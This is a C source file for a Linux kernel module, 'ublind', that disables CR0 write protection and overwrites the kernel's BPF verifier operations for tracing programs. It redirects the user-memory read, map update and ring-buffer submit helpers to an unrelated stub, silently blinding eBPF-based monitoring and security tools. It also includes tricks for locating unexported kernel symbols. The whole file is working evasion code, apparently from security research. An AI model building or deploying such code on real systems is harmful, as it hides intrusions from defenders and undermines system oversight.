#include <linux/module.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/spinlock.h>
#include <linux/rhashtable.h>
#include <linux/slab.h>
#include <linux/miscdevice.h>
#include <linux/bpf.h>

MODULE_LICENSE("GPL");
// Char we show before each debug print
const char program_name[] = "ublind";

#ifdef __x86_64__
extern unsigned long set_cr0(unsigned long);
extern unsigned long reset_wp(void);
#endif /* __x86_64__ */

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,10,0)
#include <linux/static_call.h>

static unsigned long lkcd_lookup_name_scinit(const char *name);
unsigned long kallsyms_lookup_name_c(const char *name)
{
	return 0;
}

DEFINE_STATIC_CALL(lkcd_lookup_name_sc, lkcd_lookup_name_scinit);
#endif

// read kernel symbols from the /proc
#define KALLSYMS_PATH "/proc/kallsyms"
#define BUFF_SIZE 256

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,4,0) && LINUX_VERSION_CODE < KERNEL_VERSION(5,10,0)

static unsigned long lkcd_lookup_name(const char *name)
{
	unsigned int i = 0, first_space_idx = 0, second_space_idx = 0; /* Read Index and indexes of spaces */
	struct file *proc_ksyms = NULL;
	loff_t pos = 0;
	unsigned long ret = 0;
	ssize_t read = 0;
	int err = 0;
	const size_t name_len = strlen(name);

	/*
	 * Buffer for each line of kallsyms file.
	 * The symbol names are limited to KSYM_NAME_LEN=128. When Linux is
	 * compiled with clang's Control Flow Integrity, there are large symbols
	 * such as
	 * __typeid__ZTSFvPvP15ieee80211_local11set_key_cmdP21ieee80211_sub_if_dataP13ieee80211_staP18ieee80211_key_confE_global_addr
	 * which lead to a line with 142 characters.
	 * Some use a buffer which can hold 256 characters, to be safe.
	 */
	char proc_ksyms_entry[256] = {0};

	proc_ksyms = filp_open("/proc/kallsyms", O_RDONLY, 0);
	if (proc_ksyms == NULL)
		goto cleanup;

	read = kernel_read(proc_ksyms, proc_ksyms_entry + i, 1, &pos);
	while (read == 1) {
		if (proc_ksyms_entry[i] == '\n' || (size_t)i == sizeof(proc_ksyms_entry) - 1) {
			/* Prefix-match the name with the 3rd field of the line, after the second space */
			if (second_space_idx > 0 &&
			    second_space_idx + 1 + name_len <= sizeof(proc_ksyms_entry) &&
			    !strncmp(proc_ksyms_entry + second_space_idx + 1, name, name_len)) {
				printk(KERN_INFO "[+] %s: %.*s\n", name,
				       i, proc_ksyms_entry);
				/* Decode the address, which is in hexadecimal */
				proc_ksyms_entry[first_space_idx] = '\0';
				err = kstrtoul(proc_ksyms_entry, 16, &ret);
				if (err) {
					printk(KERN_ERR "kstrtoul returned error %d while parsing %.*s\n",
					       err, first_space_idx, proc_ksyms_entry);
					ret = 0;
					goto cleanup;
				}
				goto cleanup;
			}

			i = 0;
			first_space_idx = 0;
			second_space_idx = 0;
			memset(proc_ksyms_entry, 0, sizeof(proc_ksyms_entry));
		} else {
			if (proc_ksyms_entry[i] == ' ') {
				if (first_space_idx == 0) {
					first_space_idx = i;
				} else if (second_space_idx == 0) {
					second_space_idx = i;
				}
			}
			i++;
		}
		read = kernel_read(proc_ksyms, proc_ksyms_entry + i, 1, &pos);
	}
	printk(KERN_ERR "symbol not found in kallsyms: %s\n", name);

cleanup:
	if (proc_ksyms != NULL)
		filp_close(proc_ksyms, 0);
	return ret;
}

#elif LINUX_VERSION_CODE >= KERNEL_VERSION(5,10,0)

static struct kprobe kp = {
	.symbol_name = "kallsyms_lookup_name",
	.flags = KPROBE_FLAG_DISABLED
};

static unsigned long lkcd_lookup_name_scinit(const char *name)
{
	unsigned long (*lkcd_lookup_name_fp)(const char *name) = NULL;
	int kp_ret;

	// try kprobes first, but have a fallback as they might be disabled
	kp_ret = register_kprobe(&kp);
	if (kp_ret < 0) {
		printk(KERN_DEBUG "register_kprobe failed, returned %d", kp_ret);
	} else {
		lkcd_lookup_name_fp = (unsigned long (*) (const char *name))kp.addr;
		unregister_kprobe(&kp);
	}

	// brute force by doing a symbolic search via sprint_symbol
	if (!lkcd_lookup_name_fp) {
		char name[KSYM_SYMBOL_LEN];
		unsigned long start = (unsigned long) sprint_symbol;
		unsigned long end = start - 32 * 1024;
		unsigned long addr, offset;
		char *off_ptr;

		for (addr = start; addr > end; addr--) {
			if (sprint_symbol(name, addr) <= 0)
				break;
			if (!strncmp(name, "0x", 2))
				break;
			off_ptr = strchr(name, '+');
			if (!off_ptr)
				break;
			if (sscanf(off_ptr, "+%lx", &offset) != 1)
				break;
			addr -= offset;
			if (off_ptr - name == 20 &&
			    !strncmp(name, "kallsyms_lookup_name", 20))
			{
				lkcd_lookup_name_fp = (void *)addr;
				break;
			}
		}

		if (!lkcd_lookup_name_fp)
			printk(KERN_DEBUG "lookup via sprint_symbol() failed, too");
	}

	if (lkcd_lookup_name_fp) {
		static_call_update(lkcd_lookup_name_sc, lkcd_lookup_name_fp);
		return static_call(lkcd_lookup_name_sc)(name);
	}

	return 0;
}

static unsigned long lkcd_lookup_name(const char *name)
{
 return static_call(lkcd_lookup_name_sc)(name);
}

#else
unsigned long lkcd_lookup_name(const char *name)
{
 return kallsyms_lookup_name(name);
}
#endif

// driver machinery
static int open_ublind(struct inode *inode, struct file *file)
{
  try_module_get(THIS_MODULE);
  return 0;
}

static int close_ublind(struct inode *inode, struct file *file) 
{
  module_put(THIS_MODULE);
  return 0;
}

static long ublind_ioctl(struct file *file, unsigned int ioctl_num, unsigned long ioctl_param)
{
  // todo: add here something to communicate with usermode
  return -EINVAL;
}

static const struct file_operations ublind_fops = {
	.open		= open_ublind,
	.release        = close_ublind,
	.unlocked_ioctl	= ublind_ioctl,
};

static struct miscdevice ublind_dev = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "ublind",
    .fops = &ublind_fops
};

// static data
int patched = 0;
struct bpf_func_proto s_read, s_read_str, s_mapu, s_ringsubmit;
// static void *addr = NULL;
// static unsigned long patch_size;
static struct bpf_verifier_ops **s_bpf_verifier_ops = NULL,
 *s_trace_original = NULL,
 s_trace_patched;
__initconst static const char *s_verops =
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,15,0)
 "bpf_verifier_ops";
#else
 "bpf_prog_types";
#endif

struct my_bpf_proto {
  int id;
  const char *name;
  struct bpf_func_proto *proto;
};

__attribute__ ((__section__ (".init.data")))
static struct my_bpf_proto s_protos[] = {
 { BPF_FUNC_map_update_elem, "map_update_elem", &s_mapu },
 { BPF_FUNC_probe_read_user, "probe_read_user", &s_read },
 { BPF_FUNC_probe_read_user_str, "probe_read_user_str", &s_read_str },
 { BPF_FUNC_ringbuf_submit, "ringbuf_submit", &s_ringsubmit },
};

static void unpatch(void)
{
  if ( !s_bpf_verifier_ops ) return;
  else {
    unsigned long old_cr0 = reset_wp();
    s_bpf_verifier_ops[BPF_PROG_TYPE_TRACING] = s_trace_original;
    patched = 0;
    set_cr0(old_cr0);
    s_bpf_verifier_ops = NULL;
  }
}

static const struct bpf_func_proto *my_func_proto(enum bpf_func_id func_id, const struct bpf_prog *prog)
{
  switch(func_id)
  {
    case BPF_FUNC_map_update_elem:
      return &s_mapu;
    case BPF_FUNC_probe_read_user:
      return &s_read;
    case BPF_FUNC_probe_read_user_str:
      return &s_read_str;
    case BPF_FUNC_ringbuf_submit:
      return &s_ringsubmit;
    default:
      return s_trace_original->get_func_proto(func_id, prog);
  }
}

extern u64 tracing_snapshot_cond_enable(u64 r1, u64 r2, u64 r3, u64 r4, u64 r5);

__init static int patch(void)
{
  unsigned long old_cr0;
  int i;
  s_trace_original = s_bpf_verifier_ops[BPF_PROG_TYPE_TRACING];
  if ( !s_trace_original ) return -EFAULT;
  memcpy(&s_trace_patched, s_trace_original, sizeof(s_trace_patched));
  s_trace_patched.get_func_proto = my_func_proto;
  // collect protos
  for ( i = 0; i < ARRAY_SIZE(s_protos); i++ )
  {
    const struct bpf_func_proto *curr = s_trace_original->get_func_proto(s_protos[i].id, NULL);
    if ( !curr )
    {
      printk("cannot resolve id %d (%s)", s_protos[i].id, s_protos[i].name);
      return -ENOCSI;
    }
    // copy
    memcpy(s_protos[i].proto, curr, sizeof(*curr));
    // patch function
    // We could implement our own stub but in this case driver must be unloadable (try to guess why)
    // another solution - reuse existing exported function from kernel
    // good candidate is tracing_snapshot_cond_enable but sure you can find some other
    s_protos[i].proto->func = tracing_snapshot_cond_enable;
  }
  old_cr0 = reset_wp();
  s_bpf_verifier_ops[BPF_PROG_TYPE_TRACING] = &s_trace_patched;
  patched = 1;
  set_cr0(old_cr0);
  return 0;
}

// init
int __init
init_module (void)
{
  int res;
  s_bpf_verifier_ops = (struct bpf_verifier_ops **)lkcd_lookup_name(s_verops);
  if ( !s_bpf_verifier_ops )
  {
    printk("cannot find %s\n", s_verops);
    return -ENOENT;
  }
  res = patch();
  if ( res ) return res;
  // register driver
  res = misc_register(&ublind_dev);
  if ( res )
  {
    printk("Unable to register the blind device\n");
    unpatch();
    return res;
  }
  // all good
  return 0;
}

void cleanup_module(void)
{
  if ( patched )
    unpatch();
  misc_deregister(&ublind_dev);
}